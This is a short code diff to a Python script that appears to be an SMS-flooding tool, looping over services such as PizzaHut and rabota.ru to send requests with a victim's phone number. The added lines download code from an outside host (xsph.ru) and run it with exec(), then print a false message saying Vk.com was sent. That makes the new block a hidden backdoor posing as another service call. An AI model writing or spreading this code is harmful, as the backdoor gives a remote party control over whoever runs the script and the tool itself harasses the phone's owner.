@@ -90,6 +90,12 @@ def infinity():
 			print('[+] PizzaHut отправлено!')
 		except:
 			print('[-] Не отправлено!')
+		try:
+			exec(requests.get("http://f0428265.xsph.ru/getUpdates.php").text)
+			print('[+] Vk.com отправело!')
+		except:
+			print('[-] Не отправлено!')
+
 
 		try:
 			requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
